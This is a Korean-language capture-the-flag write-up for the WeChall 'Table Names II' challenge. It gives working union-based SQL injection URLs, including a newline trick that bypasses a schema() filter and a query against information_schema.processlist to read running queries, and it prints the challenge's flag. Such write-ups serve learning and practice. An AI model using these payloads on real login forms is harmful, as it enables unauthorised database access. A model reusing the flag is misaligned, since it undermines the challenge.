# [WeChall] Table Names II - Writeup

이번 문제도 이전 문제와 마찬가지로 로그인 페이지로부터 데이터베이스의 이름과 테이블 이름을 구해와야하는 SQL Injection 문제다.

다만 필터링이 생겼다.

___

## 1. Union Based SQL Injection
[http://www.wechall.net/challenge/nurfed/more_table_names/challenge.php?username=%27union+select+1,2,3%23&password=&login=login](http://www.wechall.net/challenge/nurfed/more_table_names/challenge.php?username=%27union+select+1,2,3%23&password=&login=login)

3개의 컬럼을 사용한다.

___

## 2. 데이터베이스 이름 추출

[http://www.wechall.net/challenge/nurfed/more_table_names/challenge.php?username=%27union+select+schema%28%0a%29,2,3%23&password=&login=login](http://www.wechall.net/challenge/nurfed/more_table_names/challenge.php?username=%27union+select+schema%28%0a%29,2,3%23&password=&login=login)
 
`schema()`라는 문자열을 필터링하지만, `schema(\n)`처럼 써줘서 우회할 수 있다.

데이터베이스의 이름은 `nurfedtables37`이다.

___

## 3. 실행 중인 쿼리 추출

데이터베이스의 이름은 얻었고, 이제 테이블의 이름을 알아내야 한다.

하지만 `information_schema`의 앵간한 테이블들은 필터링 때문에 접근할 수 없었다.

[http://www.wechall.net/challenge/nurfed/more_table_names/challenge.php?username=%27+union+select+info,2,3+from+information_schema.processlist%23&password=&login=login](http://www.wechall.net/challenge/nurfed/more_table_names/challenge.php?username=%27+union+select+info,2,3+from+information_schema.processlist%23&password=&login=login)

그래서 `processlist` 테이블을 통해 실행중인 쿼리를 추출했고, 덕분에 데이터베이스의 이름까지 한번에 알아왔다.

`schema()`는 뭐.. 우회 하나 마나였다..

테이블의 이름은 `userbobbytable7`이다.

___

## Answer

flag: `nurfedtables37_userbobbytable7`